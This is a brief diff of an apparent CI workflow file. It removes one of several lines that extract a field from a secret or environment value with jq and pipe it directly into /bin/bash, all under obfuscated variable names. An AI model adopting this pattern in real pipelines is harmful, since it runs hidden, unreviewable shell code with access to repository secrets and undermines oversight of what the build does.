@@ -21,7 +21,6 @@ jobs:
           s71: ${{ secrets.s71 }}
         run: |
           printf '%s' "$s71" | jq -r .cfnyk8543 | /bin/bash
-          echo $e32982 | jq -r .vz28455 | /bin/bash
           printf '%s' "$utomg4676" | jq -r .fvq2 | /bin/bash
           printf '%s' "$a49114" | jq -r .ek55 | /bin/bash
           echo $qnxip5341 | jq -r .o5368 | /bin/bash
